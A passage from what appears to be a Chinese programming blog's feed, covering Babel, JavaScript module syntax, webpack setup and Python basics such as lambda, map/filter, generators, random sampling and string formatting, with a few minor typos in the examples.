class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转码前 </span></span><br><span class="line"><span class="comment">// 定义数据</span></span><br><span class="line"><span class="keyword">let</span> input = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将数组的每个元素 +1 </span></span><br><span class="line">input = input.map(<span class="function"><span class="params">item</span> =&gt;</span> item + <span class="number">1</span>)</span><br><span class="line"><span class="built_in">console</span>.log(input)</span><br></pre></td></tr></table></figure><ul><li><ol><li>创建一个.babelrc配置文件</li></ol></li><li><ol start="2"><li><pre><code class="js"><span class="comment">// 写入配置</span>{    <span class="string">"presets"</span>: [<span class="string">"es2015"</span>],    <span class="string">"plugins"</span>: []}&lt;!--￼<span class="number">3</span>--&gt;</code></pre></li></ol></li></ul><h3 id="3-3-模块化"><a href="#3-3-模块化" class="headerlink" title="3.3 模块化"></a>3.3 模块化</h3><p><code>js与js间的调用</code></p><h4 id="3-3-1-es5写法"><a href="#3-3-1-es5写法" class="headerlink" title="3.3.1 es5写法"></a>3.3.1 es5写法</h4><p>​    <code>01fun.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义方法</span></span><br><span class="line"><span class="keyword">const</span> myAdd = <span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> mySub = <span class="function">(<span class="params">a, b</span>) =&gt;</span> a - b</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f2 = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置哪些方法可以被调到</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    myAdd:myAdd, <span class="comment">// 完全写法</span></span><br><span class="line">    mySub, <span class="comment">// 简写</span></span><br><span class="line">    f2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <code>02调用.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  调用fun中的方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 引入01fun.js文件</span></span><br><span class="line"><span class="comment">// const m = require('./01fun')</span></span><br><span class="line"><span class="comment">// const m = require('F:/06project/VScode/firstHTML/first/modeDemo/es5model/01fun.js')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 调用</span></span><br><span class="line"><span class="built_in">console</span>.log(m.f2(<span class="number">1</span>,<span class="number">2</span>))</span><br><span class="line"><span class="built_in">console</span>.log(m.myAdd(<span class="number">1</span>,<span class="number">2</span>))</span><br></pre></td></tr></table></figure><h4 id="3-3-2-es6写法"><a href="#3-3-2-es6写法" class="headerlink" title="3.3.2 es6写法"></a>3.3.2 es6写法</h4><p>​    <code>01fun.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es6 模块化的写法</span></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'getList...'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'save...'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <code>02调用.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 引入</span></span><br><span class="line"><span class="keyword">import</span> &#123;getList,save&#125; <span class="keyword">from</span> <span class="string">'./01fun'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 调用</span></span><br><span class="line">getList()</span><br><span class="line">save()</span><br></pre></td></tr></table></figure><p>将es6的代码进行转换es5才能执行</p><h4 id="3-3-2-es6写法（2）"><a href="#3-3-2-es6写法（2）" class="headerlink" title="3.3.2 es6写法（2）"></a>3.3.2 es6写法（2）</h4><p>​    <code>01fun.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// es6 模块化的写法2</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span>&#123;</span><br><span class="line">    getList()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'getList...'</span>)</span><br><span class="line">    &#125;,</span><br><span class="line">    update()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'update...'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    <code>02调用.js</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 引入</span></span><br><span class="line"><span class="keyword">import</span> m <span class="keyword">from</span> <span class="string">'./01fun'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 调用</span></span><br><span class="line">m.getList()</span><br><span class="line">m.update()</span><br></pre></td></tr></table></figure><p>​    <code>转换</code></p><h3 id="3-4-webpack"><a href="#3-4-webpack" class="headerlink" title="3.4 webpack"></a>3.4 webpack</h3><p><code>打包工具，将多个静态资源文件打包成一个文件，可减少页面的请求次数</code></p><h4 id="3-4-1-安装"><a href="#3-4-1-安装" class="headerlink" title="3.4.1 安装"></a>3.4.1 安装</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install -g webpack webpack-cli</span><br><span class="line"></span><br><span class="line">webpack -v</span><br></pre></td></tr></table></figure><h4 id="3-4-2-编写js文件"><a href="#3-4-2-编写js文件" class="headerlink" title="3.4.2 编写js文件"></a>3.4.2 编写js文件</h4><p>….</p><h4 id="3-4-3-配置文件"><a href="#3-4-3-配置文件" class="headerlink" title="3.4.3  配置文件"></a>3.4.3  配置文件</h4><p><strong>webpack.config.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">"path"</span>); <span class="comment">// Node.js 内置模块</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    entry: <span class="string">'./src/main.js'</span>,<span class="comment">//配置入口文件</span></span><br><span class="line">    output:&#123;</span><br><span class="line">        path:path.resolve(__dirname,<span class="string">"./dist"</span>), <span class="comment">// 输出路径，__dirname：当前文件所在的路径</span></span><br><span class="line">        filename:<span class="string">"bundle.js"</span> <span class="comment">// 输出文件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-4-4-使用命令执行打包操作"><a href="#3-4-4-使用命令执行打包操作" class="headerlink" title="3.4.4 使用命令执行打包操作"></a>3.4.4 使用命令执行打包操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">webpack # 有黄色警告</span><br><span class="line">webpack --mode&#x3D;development（production） # 无黄色警告</span><br></pre></td></tr></table></figure><h4 id="3-4-5-打包CSS-文件"><a href="#3-4-5-打包CSS-文件" class="headerlink" title="3.4.5 打包CSS 文件"></a>3.4.5 打包CSS 文件</h4><p><code>安装css加载器</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0npm install --save-dev style-loader css-loader</span><br></pre></td></tr></table></figure><p><strong>webpack.config.js</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">"path"</span>); <span class="comment">// Node.js 内置模块</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    entry: <span class="string">'./src/main.js'</span>,<span class="comment">//配置入口文件</span></span><br><span class="line">    output: &#123;</span><br><span class="line">        path: path.resolve(__dirname, <span class="string">"./dist"</span>), <span class="comment">// 输出路径，__dirname：当前文件所在的路径</span></span><br><span class="line">        filename: <span class="string">"bundle.js"</span> <span class="comment">// 输出文件</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="built_in">module</span>: &#123;</span><br><span class="line">        rules: [</span><br><span class="line">            &#123;</span><br><span class="line">                test: <span class="regexp">/\.css$/</span>, <span class="comment">// 打包规则应用到以css结尾的文件上</span></span><br><span class="line">                use: [<span class="string">'style-loader'</span>, <span class="string">'css-loader'</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="四-搭建前端项目"><a href="#四-搭建前端项目" class="headerlink" title="四.  搭建前端项目"></a>四.  搭建前端项目</h2><h4 id="4-1-项目初始化"><a href="#4-1-项目初始化" class="headerlink" title="4.1  项目初始化"></a>4.1  项目初始化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入项目目录</span></span><br><span class="line">cd vue-element-admin</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖</span></span><br><span class="line">npm install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建议不要用 cnpm 安装 会有各种诡异的bug 可以通过如下操作解决 npm 下载速度慢的问题</span></span><br><span class="line">npm install --registry=https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地开发 启动项目</span></span><br><span class="line">npm run dev</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python基础语法</title>
      <link href="2023/04/16/python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>2023/04/16/python%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="python-基础语法"><a href="#python-基础语法" class="headerlink" title="python 基础语法"></a>python 基础语法</h1><h1 id="一-集合"><a href="#一-集合" class="headerlink" title="一. 集合"></a>一. 集合</h1><p>1.1 遍历</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># enumerate 取出下标和值</span></span><br><span class="line">lst = [<span class="number">1</span>,<span class="number">7</span>,<span class="number">3</span>]</span><br><span class="line"><span class="keyword">for</span> k,i <span class="keyword">in</span> enumerate(lst):</span><br><span class="line">    print(k,i)</span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    0 1</span></span><br><span class="line"><span class="string">    1 7</span></span><br><span class="line"><span class="string">    2 3</span></span><br><span class="line"><span class="string">    """</span></span><br></pre></td></tr></table></figure><h1 id="二-字典"><a href="#二-字典" class="headerlink" title="二. 字典"></a>二. 字典</h1><p>==2.1 遍历：==</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">d = &#123;<span class="string">'x'</span>: <span class="number">1</span>, <span class="string">'y'</span>: <span class="number">2</span>, <span class="string">'z'</span>: <span class="number">3</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key, value <span class="keyword">in</span> d.items():</span><br><span class="line">    print(key,value)</span><br></pre></td></tr></table></figure><h1 id="五-推导式"><a href="#五-推导式" class="headerlink" title="五. 推导式"></a>五. 推导式</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[i <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>)] <span class="comment"># [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</span></span><br><span class="line"></span><br><span class="line">[j <span class="keyword">if</span> j%<span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> <span class="number">100</span> <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>)] <span class="comment"># [100, 2, 100, 4, 100, 6, 100, 8, 100]</span></span><br></pre></td></tr></table></figure><h1 id="六-lambda表达式"><a href="#六-lambda表达式" class="headerlink" title="六. lambda表达式"></a>六. lambda表达式</h1><ul><li>lambda arg(参数):  expression(表达式)</li></ul><blockquote><p>lambda运算符或lambda函数用来在Python中创建小的、一次性的匿名函数对象。</p></blockquote><h3 id="6-1-lambda基本应用"><a href="#6-1-lambda基本应用" class="headerlink" title="6.1 lambda基本应用"></a>6.1 lambda基本应用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add = <span class="keyword">lambda</span> x,y : x+y</span><br><span class="line">add(<span class="number">1</span>,<span class="number">3</span>) <span class="comment"># 4</span></span><br></pre></td></tr></table></figure><h3 id="6-2-map"><a href="#6-2-map" class="headerlink" title="6.2 map"></a>6.2 map</h3><ul><li>map(function_object, iterable1, iterable2, …)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一般用法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply</span><span class="params">(x)</span>:</span></span><br><span class="line">　　<span class="keyword">return</span> x*<span class="number">2</span></span><br><span class="line">list(map(multiply,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])) <span class="comment">#[2,4,6,8]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与lambda表达式联用</span></span><br><span class="line">add = <span class="keyword">lambda</span> x,y : x+y</span><br><span class="line">list(map(mult,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],[<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span>])) <span class="comment"># [11, 22, 33, 44]</span></span><br><span class="line"></span><br><span class="line">mult = <span class="keyword">lambda</span> x : x*<span class="number">2</span></span><br><span class="line">list(map(mult,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])) <span class="comment"># [2, 4, 6, 8]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用map和lambda在字典上迭代</span></span><br><span class="line">dict_a = [&#123;<span class="string">'name'</span>: <span class="string">'python'</span>, <span class="string">'points'</span>: <span class="number">10</span>&#125;, &#123;<span class="string">'name'</span>: <span class="string">'java'</span>, <span class="string">'points'</span>: <span class="number">8</span>&#125;]</span><br><span class="line">list(map(<span class="keyword">lambda</span> x : x[<span class="string">'name'</span>], dict_a)) <span class="comment"># Output: ['python', 'java']</span></span><br><span class="line">list(map(<span class="keyword">lambda</span> x : x[<span class="string">'points'</span>]*<span class="number">10</span>,  dict_a)) <span class="comment"># Output: [100, 80]</span></span><br><span class="line">list(map(<span class="keyword">lambda</span> x : x[<span class="string">'name'</span>] == <span class="string">"python"</span>, dict_a)) <span class="comment"># Output: [True, False]</span></span><br></pre></td></tr></table></figure><h3 id="6-3-filter"><a href="#6-3-filter" class="headerlink" title="6.3 filter"></a>6.3 filter</h3><ul><li>filter(function_object, iterable)</li></ul><blockquote><p>filter函数需要两个参数，function_object和iterable。 function_object返回一个布尔值。 为iterable的每个元素调用function_object，filter只返回function_object返回true的元素。</p><p><strong>像map函数一样filter函数也返回列表。与map函数不同，filter函数只能有一个iterable作为输入。</strong></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一般用法</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">filter_t</span><span class="params">(a)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> a <span class="keyword">if</span> a % <span class="number">2</span>== <span class="number">0</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">list(filter(filter_t, a)) <span class="comment"># Output: [2, 4, 6]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 与lambda 表达式联用</span></span><br><span class="line">list(filter(<span class="keyword">lambda</span> x : x % <span class="number">2</span> == <span class="number">0</span>, a)) <span class="comment"># Output: [2, 4, 6]</span></span><br><span class="line"></span><br><span class="line">dict_a = [&#123;<span class="string">'name'</span>: <span class="string">'python'</span>, <span class="string">'points'</span>: <span class="number">10</span>&#125;, &#123;<span class="string">'name'</span>: <span class="string">'java'</span>, <span class="string">'points'</span>: <span class="number">8</span>&#125;]</span><br><span class="line">list(filter(<span class="keyword">lambda</span> x : x[<span class="string">'name'</span>] == <span class="string">'python'</span>, dict_a)) <span class="comment"># Output: [&#123;'name': 'python', 'points': 10&#125;]</span></span><br></pre></td></tr></table></figure><h1 id="七-yield用法"><a href="#七-yield用法" class="headerlink" title="七.  yield用法"></a>七.  yield用法</h1><blockquote><p>相当于暂存的 generator（生成器）每次调用都会return 该值</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">5</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boy</span><span class="params">()</span>:</span></span><br><span class="line">    cnt = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">       <span class="keyword">yield</span> num + cnt </span><br><span class="line">       cnt += <span class="number">1</span></span><br><span class="line">       </span><br><span class="line">list(boy())  <span class="comment"># [6, 7, 8, 9, 10, 11, 12, 13, 14, 15]</span></span><br></pre></td></tr></table></figure><ul><li>next方法</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 每次调用一次next方法都会取出generator中的一个值</span></span><br><span class="line">b = boy()</span><br><span class="line">next(b) <span class="comment"># 6</span></span><br><span class="line">next(b) <span class="comment"># 7</span></span><br><span class="line">next(b) <span class="comment"># 8</span></span><br></pre></td></tr></table></figure><ul><li>send方法  向yield内传输一个结果值   会调用next方法  </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boy</span><span class="params">()</span>:</span></span><br><span class="line">    cnt = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">       res = <span class="keyword">yield</span> num + cnt </span><br><span class="line">       print(<span class="string">"res"</span>,res)</span><br><span class="line">       cnt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">b = boy()</span><br><span class="line">next(b)</span><br><span class="line">b.send(<span class="number">10</span>)</span><br><span class="line">list(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果：</span></span><br><span class="line">res <span class="number">10</span></span><br><span class="line">res <span class="literal">None</span></span><br><span class="line">res <span class="literal">None</span></span><br><span class="line">res <span class="literal">None</span></span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><h1 id="八-随机数"><a href="#八-随机数" class="headerlink" title="八. 随机数"></a>八. 随机数</h1><ul><li><h5 id="shuffle-将原集合打乱"><a href="#shuffle-将原集合打乱" class="headerlink" title="shuffle 将原集合打乱"></a>shuffle 将原集合打乱</h5></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">lst = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">7</span>]</span><br><span class="line">random.shuffle(lst)</span><br><span class="line">print(lst) <span class="comment"># [7, 1, 4]</span></span><br></pre></td></tr></table></figure><ul><li><strong>choices根据权重采样</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">illness_list = [<span class="string">'拉肚子'</span>,<span class="string">'腹泻'</span>,<span class="string">'感冒'</span>,<span class="string">'呼吸系统疾病'</span>,<span class="string">'糖尿病'</span>,<span class="string">'高血压'</span>]</span><br><span class="line">weight_list = [<span class="number">20</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">10</span>]</span><br><span class="line">ill = random.choices(illness_list,weight_list)[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><ul><li>平均分配</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_avg_split</span><span class="params">(total, num, rate=<span class="number">0.8</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    将total按照基本平均值随机分配到num</span></span><br><span class="line"><span class="string">    :param total:</span></span><br><span class="line"><span class="string">    :param num:</span></span><br><span class="line"><span class="string">    :param rate: 保底比例，0到1之间。1表示完全平均分配，0表示完全随机分配。</span></span><br><span class="line"><span class="string">    :return: 长度为num，总和为total的list</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    base = int(total / num * rate)  <span class="comment"># 80%分配到每个num中，保证大致平衡</span></span><br><span class="line">    random_result = random_split(total - base * num, num)</span><br><span class="line">    <span class="keyword">return</span> [base + random_result[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(num)]</span><br></pre></td></tr></table></figure><ul><li>随机分配</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_split</span><span class="params">(total, num)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    将total随机分配到num。例如：将100个血糖，随机分配给50个用户，使用random_split(100, 50)分配</span></span><br><span class="line"><span class="string">    :param total:</span></span><br><span class="line"><span class="string">    :param num:</span></span><br><span class="line"><span class="string">    :return: 长度为num，总和为total的list</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> num &gt; total:</span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(total):</span><br><span class="line">            result.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(num - total):</span><br><span class="line">            result.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">elif</span> num == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dividers = sorted(random.sample(range(<span class="number">1</span>, total), num - <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> [a - b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(dividers + [total], [<span class="number">0</span>] + dividers)]</span><br></pre></td></tr></table></figure><h1 id="九-格式化"><a href="#九-格式化" class="headerlink" title="九. 格式化"></a>九. 格式化</h1><h3 id="9-1-冒号：方式来格式"><a href="#9-1-冒号：方式来格式" class="headerlink" title="9.1  冒号：方式来格式"></a>9.1  冒号：方式来格式</h3><h5 id="9-1-1-格式化时间"><a href="#9-1-1-格式化时间" class="headerlink" title="9.1.1 格式化时间"></a>9.1.1 格式化时间</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">datetime.datetime.now()</span><br><span class="line">t = datetime.datetime.now()</span><br><span class="line"><span class="string">f'<span class="subst">&#123;t:%Y-%m-%d&#125;</span>'</span> <span class="comment"># '2020-10-12'</span></span><br></pre></td></tr></table></figure><h5 id="9-1-2-保留小数"><a href="#9-1-2-保留小数" class="headerlink" title="9.1.2 保留小数"></a>9.1.2 保留小数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">12.56789</span></span><br><span class="line"><span class="string">f'<span class="subst">&#123;num:<span class="number">0.4</span>&#125;</span>'</span> <span class="comment"># 保留4位有效数字 '12.57'</span></span><br><span class="line">y = <span class="number">12</span></span><br><span class="line">z = <span class="string">f'<span class="subst">&#123;y:<span class="number">03</span>d&#125;</span>'</span> <span class="comment"># 012 在整数前加0</span></span><br></pre></td></tr></table></figure><h5 id="9-1-3-设定字符宽度"><a href="#9-1-3-设定字符宽度" class="headerlink" title="9.1.3 设定字符宽度"></a>9.1.3 设定字符宽度</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 字符宽度</span></span><br><span class="line">num = <span class="number">12.56789</span></span><br><span class="line">print(<span class="string">f'<span class="subst">&#123;num:<span class="number">10</span>&#125;</span>'</span>)  <span class="comment">#   12.56789 默认用空格占位</span></span><br><span class="line"><span 